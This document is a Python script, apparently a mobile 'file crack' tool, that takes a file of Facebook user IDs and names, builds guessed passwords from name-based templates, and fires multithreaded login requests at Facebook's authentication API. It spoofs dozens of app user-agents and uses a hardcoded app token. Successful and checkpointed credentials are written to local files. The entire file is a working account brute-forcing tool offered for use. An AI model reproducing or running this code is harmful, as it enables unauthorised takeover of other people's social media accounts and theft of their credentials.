import os
import sys
import time
import uuid
import json
import random
import requests
from os import system as cmd
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed_x

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
idz = []
oks = []
cps = []

def oo(text):
    return f"{w}[{g}{text}{w}]"

def logo():
    cmd("clear")
    print(banner)

def linex():
    print(f"{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

def main():
    logo()
    print(f" {oo('1')} File Crack ")
    print(f" {oo('2')} Follow Github ")
    print(f" {oo('3')} Exit Tool ")
    linex()
    x = input(f" {oo('?')} Select : ")
    if x == "1":
        start()
    elif x == "2":
        os.system("xdg-open https://github.com/Kazim-404")
        main()
    elif x == "3":
        linex()
        print(f" {oo('!')} {g}Thanks For Using Tool ")
        linex()
        exit()
    else:
        linex()
        print(f" {oo('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def start():
    logo()
    print(f" {oo('â€¢')} Example : {g}/sdcard/file.txt ")
    linex()
    try:
        file_path = input(f" {oo('?')} File Path : ")
        for x in open(file_path, "r").readlines():
            idz.append(x.strip())
    except Exception:
        linex()
        print(f" {oo('!')} File Not Found >> {g}{file_path} ")
        linex()
        time.sleep(1)
        main()
    logo()
    try:
        ps_limit = int(input(f" {oo('?')} Enter Password Limit : "))
    except ValueError:
        ps_limit = 5
    logo()
    print(f" {oo('â€¢')} Example : {g}first123, first1234, first12345 ")
    linex()
    ps_list = []
    for x in range(ps_limit):
        ps_ask = input(f" {oo(x+1)} Enter Password : ")
        ps_list.append(ps_ask)
    with speed_x(max_workers=30) as kazim:
        logo()
        total_idz = str(len(idz))
        print(f" {oo('â€¢')} Total Accounts : {g}{total_idz} ")
        print(f" {oo('!')} Brute Has Been Started ")
        print(f" {oo('!')} {r}Use Flight Mode For Speed Up ")
        linex()
        for x in idz:
            uid, name = x.split("|")
            pww = ps_list
            kazim.submit(cracker, uid, name, pww, total_idz)
    linex()
    print(f" {oo('â€¢')} Process Completed ")
    print(f" {oo('â€¢')} Total Ok Accounts : {g}{str(len(oks))} ")
    print(f" {oo('â€¢')} Total Cp Accounts : {r}{str(len(cps))} ")
    linex()
    input(f" {oo('!')} Press enter to back ")
    exit()

def cracker(uid, name, pww, total_idz):
    global loop
    global oks
    global cps
    sys.stdout.write(f"\r {w}[Running] [{loop}/{total_idz}] [{len(oks)}/{len(cps)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pww:
            ps = pw.replace("first", first).replace("last", last).replace("name", name).lower()
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/153636076;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/153636076;FBDM//*{density=2.0,width=1440,height=3840};FBLC/es_ES;FBRV/373309996;FBCR/TECNO;FBMF/Xiaomi;FBBD/Sony;FBPN/com.facebook.katana;FBDV/HTC_Drive_13;FBSV/15;FBOP/4;FBCA/armeabi;FBSS/12;]"
            ua = "[FB4A/;FBAV/;FBBV/956285046;FBAN/FB4A;FBAV/;FBBV/956285046;FBDM//*{density=2.0,width=2560,height=1280};FBLC/zh_CN;FBRV/877536266;FBCR/TECNO;FBMF/Xiaomi;FBBD/GFive;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N600;FBSV/15;FBOP/8;FBCA/armeabi-v7a;FBSS/;]"
            ua = "[FBAN/;FBAV/4Q095MQG;FBBV/849419169;FBAN/FBAN;FBAV/4Q095MQG;FBBV/849419169;FBDM//*{density=3.0,width=1920,height=1920};FBLC/ru_RU;FBRV/851543148;FBCR/Realme;FBMF/VIVO;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Vivo_X60_Pro;FBSV/17;FBOP/6;FBCA/x86_64;FBSS/15;]"
            ua = "[FBAN/;FBAV/;FBBV/685718231;FBAN/FBAN;FBAV/;FBBV/685718231;FBDM//*{density=3.0,width=1920,height=1280};FBLC/zh_CN;FBRV/885336271;FBCR/OPPO;FBMF/Apple;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G200;FBSV/14;FBOP/4;FBCA/x86;FBSS/;]"
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/484231071;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/484231071;FBDM//*{density=2.0,width=1440,height=3840};FBLC/fr_FR;FBRV/190898929;FBCR/Nokia;FBMF/VIVO;FBBD/Honor;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G1000;FBSV/15;FBOP/5;FBCA/armeabi-v7a;FBSS/;]"
            ua = "[FB4A/;FBAV/;FBBV/806587672;FBAN/FB4A;FBAV/;FBBV/806587672;FBDM//*{density=2.0,width=720,height=4096};FBLC/ja_JP;FBRV/555015930;FBCR/LG;FBMF/Xiaomi;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/SM-N980BDS;FBSV/17;FBOP/5;FBCA/x86;FBSS/14;]"
            ua = "[FB4A/;FBAV/4Q095MQG;FBBV/170548134;FBAN/FB4A;FBAV/4Q095MQG;FBBV/170548134;FBDM//*{density=2.5,width=720,height=1280};FBLC/zh_CN;FBRV/298259438;FBCR/Realme;FBMF/Xiaomi;FBBD/Parla;FBPN/com.facebook.katana;FBDV/Realme_X12;FBSV/15;FBOP/7;FBCA/arm64-v8a;FBSS/;]"
            ua = "[FBAN/;FBAV/A1XDL5U4;FBBV/810853092;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/810853092;FBDM//*{density=3.0,width=720,height=2560};FBLC/fr_FR;FBRV/978465644;FBCR/Sony;FBMF/Motorola;FBBD/Blackview;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5A;FBSV/17;FBOP/7;FBCA/x86;FBSS/11;]"
            ua = "[FB4A/;FBAV/;FBBV/804188524;FBAN/FB4A;FBAV/;FBBV/804188524;FBDM//*{density=2.0,width=2560,height=1920};FBLC/fr_FR;FBRV/518018632;FBCR/Realme;FBMF/Motorola;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5J;FBSV/17;FBOP/7;FBCA/arm64-v8a;FBSS/;]"
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/795719130;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/795719130;FBDM//*{density=1.5,width=1080,height=4096};FBLC/en_US;FBRV/597578229;FBCR/Realme;FBMF/Apple;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Realme_X15;FBSV/12;FBOP/5;FBCA/x86;FBSS/10;]"
            ua = "[FBAN/;FBAV/YZWSES93;FBBV/690813260;FBAN/FBAN;FBAV/YZWSES93;FBBV/690813260;FBDM//*{density=1.5,width=1080,height=3840};FBLC/de_DE;FBRV/514853571;FBCR/OPPO;FBMF/Motorola;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/Oppo_Reno_9;FBSV/14;FBOP/8;FBCA/x86_64;FBSS/13;]"
            ua = "[FBAN/;FBAV/YZWSES93;FBBV/615036116;FBAN/FBAN;FBAV/YZWSES93;FBBV/615036116;FBDM//*{density=2.5,width=1080,height=2560};FBLC/es_ES;FBRV/319480995;FBCR/Sony;FBMF/Motorola;FBBD/ASUS;FBPN/com.facebook.katana;FBDV/Oppo_Reno_8;FBSV/16;FBOP/7;FBCA/x86;FBSS/20;]"
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/658037975;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/658037975;FBDM//*{density=3.0,width=1920,height=3840};FBLC/en_US;FBRV/113578479;FBCR/OPPO;FBMF/Xiaomi;FBBD/Sanyo;FBPN/com.facebook.katana;FBDV/Pixel_5;FBSV/15;FBOP/6;FBCA/armeabi;FBSS/;]"
            ua = "[FB4A/;FBAV/YZWSES93;FBBV/812850865;FBAN/FB4A;FBAV/YZWSES93;FBBV/812850865;FBDM//*{density=1.5,width=1920,height=3840};FBLC/ja_JP;FBRV/344272238;FBCR/Realme;FBMF/Motorola;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5_IV;FBSV/15;FBOP/5;FBCA/armeabi-v7a;FBSS/;]"
            ua = "[FBAN/;FBAV/4Q095MQG;FBBV/341964953;FBAN/FBAN;FBAV/4Q095MQG;FBBV/341964953;FBDM//*{density=3.0,width=2560,height=3840};FBLC/fr_FR;FBRV/783076362;FBCR/TECNO;FBMF/Xiaomi;FBBD/Medion;FBPN/com.facebook.katana;FBDV/LG_Velvet;FBSV/17;FBOP/7;FBCA/arm64-v8a;FBSS/;]"
            ua = "[FB4A/;FBAV/YZWSES93;FBBV/238254513;FBAN/FB4A;FBAV/YZWSES93;FBBV/238254513;FBDM//*{density=2.5,width=2560,height=1920};FBLC/ja_JP;FBRV/509114152;FBCR/OPPO;FBMF/OnePlus;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12Z;FBSV/11;FBOP/6;FBCA/x86;FBSS/11;]"
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/108600513;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/108600513;FBDM//*{density=3.0,width=1440,height=3840};FBLC/fr_FR;FBRV/981245914;FBCR/Nokia;FBMF/Xiaomi;FBBD/GFive;FBPN/com.facebook.katana;FBDV/Realme_X16;FBSV/17;FBOP/5;FBCA/x86;FBSS/11;]"
            ua = "[FBAN/;FBAV/YZWSES93;FBBV/304903101;FBAN/FBAN;FBAV/YZWSES93;FBBV/304903101;FBDM//*{density=1.5,width=1080,height=2560};FBLC/ja_JP;FBRV/351127697;FBCR/Realme;FBMF/Motorola;FBBD/LG;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N900;FBSV/14;FBOP/8;FBCA/armeabi-v7a;FBSS/17;]"
            ua = "[FB4A/;FBAV/4Q095MQG;FBBV/649170959;FBAN/FB4A;FBAV/4Q095MQG;FBBV/649170959;FBDM//*{density=1.5,width=1080,height=3840};FBLC/ja_JP;FBRV/390535382;FBCR/Realme;FBMF/OnePlus;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A42;FBSV/13;FBOP/6;FBCA/x86_64;FBSS/;]"
            ua = "[FBAN/;FBAV/YZWSES93;FBBV/412382713;FBAN/FBAN;FBAV/YZWSES93;FBBV/412382713;FBDM//*{density=1.5,width=2560,height=2560};FBLC/es_ES;FBRV/669470728;FBCR/TECNO;FBMF/Motorola;FBBD/Lava;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A42;FBSV/17;FBOP/4;FBCA/x86;FBSS/20;]"
            ua = "[FB4A/;FBAV/4Q095MQG;FBBV/657771034;FBAN/FB4A;FBAV/4Q095MQG;FBBV/657771034;FBDM//*{density=2.0,width=2560,height=2560};FBLC/ru_RU;FBRV/382984472;FBCR/OPPO;FBMF/Xiaomi;FBBD/Google;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A82;FBSV/11;FBOP/7;FBCA/armeabi;FBSS/;]"
            ua = "[FB4A/;FBAV/YZWSES93;FBBV/691083607;FBAN/FB4A;FBAV/YZWSES93;FBBV/691083607;FBDM//*{density=2.0,width=2560,height=1920};FBLC/zh_CN;FBRV/598603164;FBCR/TECNO;FBMF/VIVO;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/Oppo_Reno_9;FBSV/17;FBOP/5;FBCA/x86_64;FBSS/;]"
            ua = "[FBAN/;FBAV/4Q095MQG;FBBV/664745315;FBAN/FBAN;FBAV/4Q095MQG;FBBV/664745315;FBDM//*{density=3.0,width=1080,height=1280};FBLC/it_IT;FBRV/891455065;FBCR/Sony;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Realme_X11;FBSV/12;FBOP/5;FBCA/x86;FBSS/;]"
            ua = "[FBAN/;FBAV/4Q095MQG;FBBV/977777241;FBAN/FBAN;FBAV/4Q095MQG;FBBV/977777241;FBDM//*{density=2.0,width=2560,height=1920};FBLC/zh_CN;FBRV/287827091;FBCR/Realme;FBMF/Motorola;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/HTC_Desire_21;FBSV/16;FBOP/4;FBCA/x86;FBSS/;]"
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/162554595;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/162554595;FBDM//*{density=2.0,width=2560,height=3840};FBLC/es_ES;FBRV/904121724;FBCR/OPPO;FBMF/Xiaomi;FBBD/Haier;FBPN/com.facebook.katana;FBDV/LG_Q9;FBSV/12;FBOP/6;FBCA/arm64-v8a;FBSS/;]"
            ua = "[FBAN/;FBAV/4Q095MQG;FBBV/256306013;FBAN/FBAN;FBAV/4Q095MQG;FBBV/256306013;FBDM//*{density=2.5,width=1440,height=3840};FBLC/en_US;FBRV/411180468;FBCR/Realme;FBMF/Xiaomi;FBBD/HMD_Global;FBPN/com.facebook.katana;FBDV/Oppo_Reno_13;FBSV/17;FBOP/4;FBCA/arm64-v8a;FBSS/16;]"
            ua = "[FB4A/;FBAV/4Q095MQG;FBBV/902424815;FBAN/FB4A;FBAV/4Q095MQG;FBBV/902424815;FBDM//*{density=1.5,width=1080,height=4096};FBLC/fr_FR;FBRV/658193162;FBCR/Realme;FBMF/Xiaomi;FBBD/Alcatel;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12X;FBSV/12;FBOP/5;FBCA/x86_64;FBSS/19;]"
            ua = "[FBAN/;FBAV/4Q095MQG;FBBV/549873997;FBAN/FBAN;FBAV/4Q095MQG;FBBV/549873997;FBDM//*{density=2.0,width=2560,height=3840};FBLC/fr_FR;FBRV/740136456;FBCR/Nokia;FBMF/Apple;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/OnePlus_10;FBSV/12;FBOP/5;FBCA/x86_64;FBSS/17;]"
            ua = "[FBAN/;FBAV/;FBBV/334135556;FBAN/FBAN;FBAV/;FBBV/334135556;FBDM//*{density=3.0,width=720,height=4096};FBLC/it_IT;FBRV/794165004;FBCR/TECNO;FBMF/Apple;FBBD/Zebra;FBPN/com.facebook.katana;FBDV/Pixel_5;FBSV/11;FBOP/7;FBCA/x86_64;FBSS/18;]"
            ua = "[FBAN/;FBAV/YZWSES93;FBBV/616146305;FBAN/FBAN;FBAV/YZWSES93;FBBV/616146305;FBDM//*{density=2.0,width=1440,height=2560};FBLC/fr_FR;FBRV/743108061;FBCR/LG;FBMF/OnePlus;FBBD/Blu;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/14;FBOP/8;FBCA/armeabi;FBSS/;]"
            ua = "[FBAN/;FBAV/A1XDL5U4;FBBV/121586468;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/121586468;FBDM//*{density=1.5,width=2560,height=2560};FBLC/de_DE;FBRV/143908242;FBCR/Nokia;FBMF/OnePlus;FBBD/Google;FBPN/com.facebook.katana;FBDV/Realme_X10;FBSV/15;FBOP/8;FBCA/x86_64;FBSS/;]"
            ua = "[FBAN/;FBAV/A1XDL5U4;FBBV/147759886;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/147759886;FBDM//*{density=3.0,width=1080,height=3840};FBLC/fr_FR;FBRV/596266281;FBCR/LG;FBMF/OnePlus;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Vivo_Y53s;FBSV/12;FBOP/6;FBCA/armeabi-v7a;FBSS/;]"
            ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/195292598;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/195292598;FBDM//*{density=2.0,width=720,height=2560};FBLC/ja_JP;FBRV/947153411;FBCR/LG;FBMF/VIVO;FBBD/Nubia;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/13;FBOP/6;FBCA/arm64-v8a;FBSS/;]"
            ua = "[FB4A/;FBAV/4Q095MQG;FBBV/923647546;FBAN/FB4A;FBAV/4Q095MQG;FBBV/923647546;FBDM//*{density=3.0,width=1920,height=1280};FBLC/ja_JP;FBRV/276266943;FBCR/OPPO;FBMF/Xiaomi;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Oppo_Reno_7;FBSV/15;FBOP/7;FBCA/armeabi;FBSS/;]"
            ua = "[FB4A/;FBAV/4Q095MQG;FBBV/354803830;FBAN/FB4A;FBAV/4Q095MQG;FBBV/354803830;FBDM//*{density=2.5,width=1440,height=3840};FBLC/ja_JP;FBRV/678795543;FBCR/LG;FBMF/VIVO;FBBD/BlackBerry;FBPN/com.facebook.katana;FBDV/Oppo_Reno_11;FBSV/17;FBOP/6;FBCA/x86_64;FBSS/10;]"
            ua = "[FBAN/;FBAV/A1XDL5U4;FBBV/607658433;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/607658433;FBDM//*{density=1.5,width=1080,height=3840};FBLC/ru_RU;FBRV/735242901;FBCR/Nokia;FBMF/Motorola;FBBD/Realme;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N400;FBSV/14;FBOP/5;FBCA/arm64-v8a;FBSS/20;]"
            ua = "[FB4A/;FBAV/;FBBV/995949554;FBAN/FB4A;FBAV/;FBBV/995949554;FBDM//*{density=2.5,width=1440,height=3840};FBLC/en_US;FBRV/515098432;FBCR/TECNO;FBMF/Xiaomi;FBBD/LeEco;FBPN/com.facebook.katana;FBDV/HTC_Desire_21;FBSV/13;FBOP/6;FBCA/arm64-v8a;FBSS/;]"
            ua = "[FBAN/;FBAV/;FBBV/532100629;FBAN/FBAN;FBAV/;FBBV/532100629;FBDM//*{density=3.0,width=1920,height=1280};FBLC/it_IT;FBRV/752082838;FBCR/Sony;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/ZenFone_8;FBSV/11;FBOP/5;FBCA/armeabi;FBSS/10;]"
            ua = "[FBAN/;FBAV/A1XDL5U4;FBBV/329026018;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/329026018;FBDM//*{density=2.5,width=1440,height=4096};FBLC/en_US;FBRV/439906707;FBCR/Realme;FBMF/VIVO;FBBD/Medion;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12;FBSV/16;FBOP/8;FBCA/x86_64;FBSS/18;]"
            ua = "[FBAN/;FBAV/A1XDL5U4;FBBV/332213309;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/332213309;FBDM//*{density=3.0,width=2560,height=1280};FBLC/fr_FR;FBRV/458126038;FBCR/Nokia;FBMF/OnePlus;FBBD/Razer;FBPN/com.facebook.katana;FBDV/LG_Velvet;FBSV/15;FBOP/8;FBCA/x86;FBSS/14;]"
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': ps,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '33055',
                'X-FB-SIM-HNI': '32866',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                print(f" {g}[KAZIM-OK] {uid}|{ps}")
                open("/sdcard/Kazim-Ok.txt", "a").write(f"{uid}|{ps}")
                oks.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[KAZIM-CP] {uid}|{ps}")
                open("/sdcard/Kazim-Cp.txt", "a").write(f"{uid}|{ps}")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
{w}  db   dD  .d8b.  d88888D d888888b .88b  d88. 
{w}  88 ,8P' d8' `8b YP  d8'   `88'   88'YbdP`88 
{g}  88,8P   88ooo88    d8'     88    88  88  88 
{g}  88`8b   88~~~88   d8'      88    88  88  88 
{w}  88 `88. 88   88  d8' db   .88.   88  88  88 
{w}  YP   YD YP   YP d88888P Y888888P YP  YP  YP 
{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 {oo('â€¢')} Author  : Muhammad Kazim
 {oo('â€¢')} GitHub  : https://github.com/Kazim-404
 {oo('â€¢')} Version : 0.1
{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\
"""

main()
